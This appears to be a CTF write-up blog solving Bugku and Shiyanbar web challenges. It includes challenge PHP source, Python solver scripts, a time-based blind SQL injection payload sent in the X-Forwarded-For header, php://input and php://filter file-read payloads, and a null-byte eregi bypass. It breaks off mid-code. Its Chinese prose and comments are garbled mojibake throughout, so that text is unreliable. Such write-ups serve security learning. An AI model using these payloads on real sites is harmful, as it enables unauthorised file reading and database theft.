<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$file=base64_decode(<span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">""</span>);</span><br><span class="line">$line=<span class="keyword">isset</span>($_GET[<span class="string">'line'</span>])?intval($_GET[<span class="string">'line'</span>]):<span class="number">0</span>;<span class="comment">//è¿™é‡Œåº”è¯¥æ˜¯baseè¿›åˆ¶è½¬æ¢ï¼Œlineä¸ºç©ºçš„è¯é»˜è®¤è®¾ç½®ä¸º0</span></span><br><span class="line"><span class="keyword">if</span>($file==<span class="string">''</span>) header(<span class="string">"location:index.php?line=&amp;filename=a2V5cy50eHQ="</span>);</span><br><span class="line">$file_list = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'0'</span> =&gt;<span class="string">'keys.txt'</span>,</span><br><span class="line"><span class="string">'1'</span> =&gt;<span class="string">'index.php'</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'margin'</span>]) &amp;&amp; $_COOKIE[<span class="string">'margin'</span>]==<span class="string">'margin'</span>)&#123;</span><br><span class="line">$file_list[<span class="number">2</span>]=<span class="string">'keys.php'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(in_array($file, $file_list))&#123;</span><br><span class="line">$fa = file($file);<span class="comment">//åº”è¯¥æ˜¯æ‰“å¼€æ–‡ä»¶çš„æ„æ€ï¼Œæ–‡ä»¶åº”è¯¥æ˜¯åœ¨åŒçº§ç›®å½•ä¸‹</span></span><br><span class="line"><span class="keyword">echo</span> $fa[$line];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åè¿™æ˜¯åˆ«äººçš„è·å–ä»£ç è„šæœ¬ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.Session()</span><br><span class="line">url=<span class="string">'http://120.24.86.145:8002/web11/index.php'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    payload=&#123;<span class="string">'line'</span>:str(i),<span class="string">'filename'</span>:<span class="string">'aW5kZXgucGhw'</span>&#125;</span><br><span class="line">    a=s.get(url,params=payload).content</span><br><span class="line">    content=str(a,encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">    print(content)</span><br></pre></td></tr></table></figure>
<p>å—¯äººå®¶çš„æ­£è§„å¾ˆå¤šå•Š</p>
<p>ç„¶åè¿™é‡Œå°±æ˜¯è¦postä¸€ä¸ªcookieï¼Œå…¶ä¸­çš„å‚æ•°æ˜¯margin=margin,è€Œä¸”è¦æŠŠfilenameè®¾ç½®ä¸º<br>
keys.phpçš„base64ç¼–ç å½¢å¼ã€‚è¿™ä¸ªå°±åœ¨burpsuiteä¸­æ“ä½œï¼š</p>
<p><img src="assets/markdown-img-paste-20181123214727533.png" alt></p>
<h2 id="bugkuâ€“insert-into">bugkuâ€“insert into</h2>
<p>the injection point is as follows:</p>
<blockquote>
<p>$sql=â€œinsert into client_ip (ip) values (â€™$ipâ€™)â€;</p>
</blockquote>
<p>the $ip comes from â€œx-forwarded-forâ€</p>
<p>and before this code, the symbol â€˜,â€™ has been filtered in our input;</p>
<p>payload are as followed:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">127.0.0.1+(<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="keyword">substr</span>((<span class="keyword">select</span> flag <span class="keyword">from</span> flag) <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>)=<span class="string">'C'</span> <span class="keyword">then</span> <span class="keyword">sleep</span>(<span class="number">5</span>) <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>)<span class="comment">-- +</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>the â€˜+â€™ on the tail is not for annotation,instead it exists for the blank space before<br>
,because the posted dataâ€™s last space will be ignored ,but adding another symbol after the space<br>
can avoid it.</p>
</blockquote>
<h2 id="å¿«é€Ÿåå¼¹postç±»å‹">å¿«é€Ÿåå¼¹postç±»å‹</h2>
<p>æ­£åˆ™è¡¨è¾¾å¼å†…å®¹è¡¥å……ï¼š</p>
<h2 id="æŸ¥è¯¢æ–¹å¼">æŸ¥è¯¢æ–¹å¼</h2>
<p>re.findall(pattern, string[, flags]) ï¼šè¿”å›stringä¸­æ‰€æœ‰ä¸patternç›¸åŒ¹é…çš„å…¨éƒ¨å­—ä¸²ï¼Œè¿”å›å½¢å¼ä¸ºæ•°ç»„ã€‚ï¼ˆæŸ¥è¯¢å¤šæ¬¡ï¼‰</p>
<p>re.finditer(pattern, string[, flags]) ï¼š<br>
è¿”å›stringä¸­æ‰€æœ‰ä¸patternç›¸åŒ¹é…çš„å…¨éƒ¨å­—ä¸²ï¼Œè¿”å›å½¢å¼ä¸ºè¿­ä»£å™¨ã€‚</p>
<p>re.search(pattern, string[, flags])ï¼šè‹¥stringä¸­åŒ…å«patternå­ä¸²ï¼Œåˆ™è¿”å›Matchå¯¹è±¡ï¼Œå¦åˆ™è¿”å›Noneï¼Œæ³¨æ„ï¼Œå¦‚æœstringä¸­å­˜åœ¨å¤šä¸ªpatternå­ä¸²ï¼Œåªè¿”å›ç¬¬ä¸€ä¸ªã€‚<br>
_sre.SRE_Matchå¯¹è±¡å¯ä»¥ç”¨.span()æ¥è¿‡æ»¤ä¿¡æ¯è¿”å›å…ƒç»„ã€‚</p>
<p>re.match(pattern, string[, flags])ï¼š<br>
ä»é¦–å­—æ¯å¼€å§‹å¼€å§‹åŒ¹é…ï¼Œstringå¦‚æœåŒ…å«patternå­ä¸²ï¼Œåˆ™åŒ¹é…æˆåŠŸï¼Œè¿”å›Matchå¯¹è±¡ï¼Œå¤±è´¥åˆ™è¿”å›Noneï¼Œè‹¥è¦å®Œå…¨åŒ¹é…ï¼Œpatternè¦ä»¥$ç»“å°¾ã€‚</p>
<h2 id="æŸ¥çœ‹æ–¹å¼">æŸ¥çœ‹æ–¹å¼</h2>
<p>group():group()ç›¸å½“äºgroup(0)ï¼Œå°†æ•´ä¸ªåŒ¹é…ç»“æœä½œä¸ºä¸€ä¸ªå…ƒç»„å¹¶è¿”å›ï¼Œäºæ‹¬å·æ— å…³ã€‚<br>
group(n)è¿”å›ç¬¬nä¸ªæ‹¬å·æœ€åä¸€æ¬¡åŒ¹é…çš„ç»“æœã€‚è¿™ä¸ªæœ‰ç‚¹éš¾ç†è§£ï¼Œä¸¾ä¾‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="string">"123abc456"</span></span><br><span class="line">print(re.search(<span class="string">"([0-9])*([a-z])*([0-9]*)"</span>,a).group(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">//è¾“å‡ºç»“æœ<span class="string">'3'</span></span><br></pre></td></tr></table></figure>
<p>groups():m.groups() == (m.group(1), â€¦)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">print(re.search(<span class="string">"([0-9])*([a-z])*([0-9]*)"</span>).groups());</span><br><span class="line">//è¾“å‡ºçš„æ˜¯(<span class="string">'3'</span>,<span class="string">'c'</span>,<span class="string">'456'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="æ­£é¢˜1ï¼šç§‹åå±±è€å¸æœº">æ­£é¢˜1ï¼šç§‹åå±±è€å¸æœº</h2>
<p>é¢˜ç›®ä¸­è®©æˆ‘ä»¬åœ¨ä¸¤ç§’å†…ç®—å‡ºä¸€ä¸ªå¼å­ã€‚</p>
<p>å¤šåˆ·æ–°å‡ æ¬¡ä¼šå‘ç°æç¤ºè®©æˆ‘ä»¬postæ•°æ®ä¸Šå»ï¼ˆæ–°å¥—è·¯getï¼šå¤šåˆ·æ–°å‡ æ¬¡ï¼‰</p>
<p>ç¼–å†™çš„pythonè„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/qiumingshan/"</span></span><br><span class="line">hohoh = requests.session()</span><br><span class="line">hoho=hohoh.get(url)</span><br><span class="line">reg = <span class="string">"[\d*\+\-\*\/]&#123;3,&#125;"</span></span><br><span class="line">search = re.findall(reg,hoho.text)</span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'value'</span>:eval(search[<span class="number">0</span>])&#125;</span><br><span class="line">flag = hohoh.post(url,data=data)</span><br><span class="line"><span class="keyword">print</span> flag.content.decode(<span class="string">'utf-8'</span>)</span><br></pre></td></tr></table></figure>
<p>ä¸€å¼€å§‹è¿è¡Œã€‚æ²¡æœ‰flagï¼Œå†åæ¥å¤šæ¬¡è¿è¡Œï¼Œç‚¹å•Šç‚¹å•Šç‚¹å•Šç»ˆäºå‡ºæ¥äº†flagï¼Œé—®æ¨æ™¨å­¦é•¿è¯´æ˜¯å¤´éƒ¨çš„é—®é¢˜ï¼Œå¯èƒ½æ˜¯cookieçš„é—®é¢˜ï¼Ÿ</p>
<h2 id="æ­£é¢˜2ï¼šå¤©ä¸‹æ­¦åŠŸå”¯å¿«ä¸ç ´">æ­£é¢˜2ï¼šå¤©ä¸‹æ­¦åŠŸå”¯å¿«ä¸ç ´</h2>
<p>æŒ‰ç…§æƒ¯ä¾‹ï¼ŒæŸ¥çœ‹æºç ï¼Œçœ‹åˆ°äº†æ³¨é‡Š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- please post what you find with parameter:key --&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç„¶åç”¨å¼€å‘è€…å·¥å…·æŸ¥çœ‹ä¸€ä¸‹responseå¤´éƒ¨ä¿¡æ¯ï¼Œå‘ç°æœ‰flagå­—æ®µä¿¡æ¯å‡ºç°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">FLAG: UDBTVF9USElTX1QwX0NINE5HRV9GTDRHOnBpVzlaU2tQZw==</span><br></pre></td></tr></table></figure>
<p>æ ¹æ®å°¾å·´ä¸Šçš„ä¸¤ä¸ªç­‰å·åˆ¤æ–­æ˜¯base64ç¼–ç ï¼Œå°è¯•è§£ç åçœ‹åˆ°</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">P0ST_THIS_T0_CH4NGE_FL4G:bIIWEyNiL</span><br></pre></td></tr></table></figure>
<p>äºæ˜¯å†™ç¨‹åºå¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://ctf5.shiyanbar.com/web/10/10.php"</span></span><br><span class="line">headers = requests.get(url).headers</span><br><span class="line">key = base64.b64decode(headers[<span class="string">'FLAG'</span>]).split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">key = &#123;<span class="string">'key'</span>:key&#125;</span><br><span class="line">print(requests.post(url,data = key).content.decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
<p>æœ‰æ—¶é—´æƒ³è¯•è¯•ç”¨æ­£åˆ™æ¥å†™</p>
<p><a href="https://blog.csdn.net/joyfixing/article/details/79971667" target="_blank" rel="noopener">https://blog.csdn.net/joyfixing/article/details/79971667</a></p>
<h2 id="æ­£é¢˜3ï¼šé€Ÿåº¦è¦å¿«">æ­£é¢˜3ï¼šé€Ÿåº¦è¦å¿«</h2>
<p>æŸ¥çœ‹æºç </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!-- OK ,now you have to post the margin what you find --&gt;</span><br></pre></td></tr></table></figure>
<p>è„šæœ¬å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">a = requests.session()</span><br><span class="line">url = <span class="string">"http://123.206.87.240:8002/web6/"</span></span><br><span class="line">b = a.get(url)</span><br><span class="line">c = base64.b64decode(b.headers[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">datapost = &#123;<span class="string">'margin'</span>:base64.b64decode(c)&#125;</span><br><span class="line">d = a.post(url,data=datapost)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">print</span> d.content.decode(<span class="string">'utf8'</span>)</span><br></pre></td></tr></table></figure>
<h2 id="never-give-up">never give up</h2>
<p>æŸ¥çœ‹æºä»£ç ï¼Œçœ‹è§æ³¨é‡Š<!--1p.html--></p>
<p>ä¿®æ”¹urlï¼Œè¿›å…¥çš„æ˜¯ctfçš„ä¸»é¡µï¼Œåœ¨viewsourceä¸­ä¿®æ”¹ä»£ç ï¼Œå¾—åˆ°äº†å¦ä¸€ä¸ªç½‘é¡µçš„æºä»£ç ï¼ŒæŸ¥æ‰¾å¾—åˆ°<br>
å¯èƒ½æ˜¯é‡å®šå‘ã€‚</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">SCRIPT</span> <span class="attr">LANGUAGE</span>=<span class="string">"Javascript"</span>&gt;</span></span><br><span class="line">&lt;!--</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> Words =<span class="string">"%3Cscript%3Ewindow.location.href%3D%27http%3A//www.bugku.com%27%3B%3C/script%3E%20%0A</span></span></span><br><span class="line">%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI</span><br><span class="line">3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU</span><br><span class="line">zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ</span><br><span class="line">lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q</span><br><span class="line">lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI</span><br><span class="line">5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN</span><br><span class="line">CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5</span><br><span class="line">0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU</span><br><span class="line">yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R</span><br><span class="line">ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ</span><br><span class="line">DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI</span><br><span class="line">xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU</span><br><span class="line">wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB</span><br><span class="line">1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span><br><span class="line"><span class="javascript"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span></span><br><span class="line">&#123;</span><br><span class="line"><span class="javascript"><span class="keyword">var</span> NewWords;</span></span><br><span class="line"><span class="javascript">NewWords = <span class="built_in">unescape</span>(Words);<span class="comment">//unescape()å‡½æ•°å¯å¯¹é€šè¿‡ escape()ç¼–ç çš„å­—ç¬¦ä¸²è¿›è¡Œè§£ç ã€‚</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//è¯¥å‡½æ•°çš„å·¥ä½œåŸç†æ˜¯è¿™æ ·çš„ï¼šé€šè¿‡æ‰¾åˆ°å½¢å¼ä¸º %xx å’Œ %uxxxx çš„å­—ç¬¦åºåˆ—ï¼ˆx è¡¨ç¤ºåå…­è¿›åˆ¶çš„æ•°å­—ï¼‰ï¼Œ</span></span></span><br><span class="line"><span class="javascript"><span class="comment">//ç”¨ Unicode å­—ç¬¦ \u00xx å’Œ \uxxxx æ›¿æ¢è¿™æ ·çš„å­—ç¬¦åºåˆ—è¿›è¡Œè§£ç ã€‚</span></span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.write(NewWords);</span></span><br><span class="line"><span class="javascript"><span class="comment">//æŠŠä¸œè¥¿ç›´æ¥å†™é“htmlé¡µé¢é‡Œé¢</span></span></span><br><span class="line">&#125;</span><br><span class="line">OutWord();</span><br><span class="line"><span class="javascript"><span class="comment">// --&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>é‚£ä¸ªä¸€å¤§ä¸²çš„ä¸œè¥¿æ˜¯urlç¼–ç çš„ä¸œè¥¿ï¼ˆè§‚å¯Ÿåˆ°å¼€å¤´å’Œç»“å°¾éƒ¨åˆ†å¯èƒ½æ˜¯ä¸€å¯¹æ³¨é‡Šçš„å¤´å°¾ï¼‰ã€‚<br>
åœ¨pythonä¸­è§£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">a=<span class="string">"%3C%21--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI</span></span><br><span class="line"><span class="string">3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCU</span></span><br><span class="line"><span class="string">zRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQ</span></span><br><span class="line"><span class="string">lNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0Q</span></span><br><span class="line"><span class="string">lMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI</span></span><br><span class="line"><span class="string">5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTN</span></span><br><span class="line"><span class="string">CJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW5</span></span><br><span class="line"><span class="string">0cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyU</span></span><br><span class="line"><span class="string">yMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3R</span></span><br><span class="line"><span class="string">ybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJ</span></span><br><span class="line"><span class="string">DMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTI</span></span><br><span class="line"><span class="string">xJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCU</span></span><br><span class="line"><span class="string">wQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB</span></span><br><span class="line"><span class="string">1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ%3D%3D--%3E"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> urllib.unquote(a)</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œé¢å‡ºæ¥çš„æ˜¯base64ç¼–ç çš„ä¸œè¥¿ï¼Œè§£ç å¾—åˆ°</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">";if(!$_GET['id'])</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">        exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">        return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');//file_get_contents - å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">//eregiæ˜¯æ­£åˆ™åŒ¹é…å‡½æ•°</span></span><br><span class="line"><span class="string">        require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å…¶å®ç›´æ¥åœ¨urlé‡Œé¢å†™ä¸€ä¸ªf4l2a3g.txtå°±å¯ä»¥å¾—åˆ°flagäº†</p>
<ul>
<li>æ­£è§£å¦‚ä¸‹ï¼š</li>
</ul>
<p>é¢˜ç›®çš„æ„æ€æ˜¯è¦æ»¡è¶³ä»¥ä¸‹æ¡ä»¶ï¼š</p>
<ul>
<li>
<p>idä¸ç­‰äº0</p>
</li>
<li>
<p>idå¼±ç­‰äº0ï¼Œé‚£ä¹ˆæŸ¥çœ‹phpçš„è¡¨æ ¼å‘ç°å­—ç¬¦ä¸²å¼±ç­‰äº0ï¼Œæ‰€ä»¥è®©id=â€œijkâ€</p>
</li>
<li>
<p>bçš„ç¬¬ä¸€ä¸ªå­—ç¬¦ä¸ç­‰äº4ï¼Œåˆè¦è®©â€œ111â€.substr(b,0,1)å’Œâ€œ1114â€åŒ¹é…èµ·æ¥ã€‚eregiå‡½æ•°å¯ä»¥ç”¨æˆªæ–­å­—ç¬¦\x00ç»•è¿‡<br>
ä½†æ˜¯æ³¨æ„åœ¨è¾“å…¥urlçš„æ—¶å€™\x00ä¼šè¢«è½¬ç ï¼Œå¯¼è‡´urlè¢«æˆªæ–­ã€‚æ³¨æ„ï¼Œè™½ç„¶ b=%0012345 å®é™…å­—ç¬¦ä¸²é•¿åº¦ä¸º 8 å­—èŠ‚ï¼Œ<br>
ä½†åœ¨åå°è„šæœ¬è¯»å…¥æ•°æ®æ—¶ï¼Œä¼šå°† URL ç¼–ç  %00 è½¬æ¢æˆ 1 å­—èŠ‚ã€‚æ‰€ä»¥è¯´ï¼Œç©ºå­—ç¬¦åº”è¯¥åœ¨åå°è„šæœ¬çš„å˜é‡ä¸­å‡ºç°ï¼Œ<br>
è€Œä¸æ˜¯åœ¨ URL æŸ¥è¯¢å­—ç¬¦ä¸²å˜é‡ä¸­å‡ºç°ã€‚</p>
</li>
<li>
<p>$data æ˜¯ç”± file_get_contents() å‡½æ•°è¯»å–å˜é‡ $a çš„å€¼è€Œå¾—ï¼Œæ‰€ä»¥ $a çš„å€¼å¿…é¡»ä¸ºæ•°æ®æµã€‚<br>
åœ¨æœåŠ¡å™¨ä¸­è‡ªå®šä¹‰ä¸€ä¸ªå†…å®¹ä¸º bugku is a nice plateform! æ–‡ä»¶ï¼Œå†æŠŠæ­¤æ–‡ä»¶è·¯å¾„èµ‹å€¼ç»™ $aï¼Œæ˜¾ç„¶ä¸å¤ªç°å®ã€‚<br>
ä¼ªåè®® php:// æ¥è®¿é—®è¾“å…¥è¾“å‡ºçš„æ•°æ®æµï¼Œå…¶ä¸­ php://input å¯ä»¥è®¿é—®åŸå§‹è¯·æ±‚æ•°æ®ä¸­çš„åªè¯»æµã€‚</p>
</li>
</ul>
<p>æ‰€ä»¥æ„é€ å¦‚ä¸‹ï¼š</p>
<pre><code>id=&quot;int&quot;&amp;b=%0012345&amp;a=php://input å¹¶åœ¨burpçš„è¯·æ±‚å¤´ä¸­æ·»åŠ bugku is a nice plateform!
</code></pre>
<h2 id="welcome-to-the-bugkuctf">welcome to the bugkuctf</h2>
<p>è¿›å…¥æºä»£ç ç•Œé¢ï¼Œfile_get_contentsè¯´æ˜å¾—æ˜¯æ•°æ®æµï¼Œçœ‹åˆ°hint.php,ç„¶åå†æ£€ç´¢æ¡†é‡Œé¢è¾“å…¥ï¼š</p>
<pre><code>index.php?txt=php://input&amp;file=hint.php
å¹¶ä¸”åœ¨burpsuiteä¸­æ·»åŠ welcome to thebugkuctf
</code></pre>
<p>å¾—åˆ°çš„åªæ˜¯hint.phpçš„æ•ˆæœç•Œé¢ï¼Œè¦çœ‹åˆ°hintçš„æºç ï¼Œè¦è¿™æ ·è¾“å…¥</p>
<pre><code>index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php
</code></pre>
<p>è¾“å‡ºä¸€å †base64ç¼–ç ï¼Œè§£ç å¾—åˆ°</p>
  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åŒæ ·çš„é“ç†ï¼Œä½¿ç”¨<br>
index.php?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=index.php</p>
<p>è§£ç å¾—åˆ°äº†index.phpçš„æºä»£ç ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"ä¸èƒ½ç°åœ¨å°±ç»™ä½ flagå“¦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($file);</span><br><span class="line">        $password = unserialize($password);</span><br><span class="line">        <span class="keyword">echo</span> $password;</span><br><span class="line">    &#125;</span><br><span 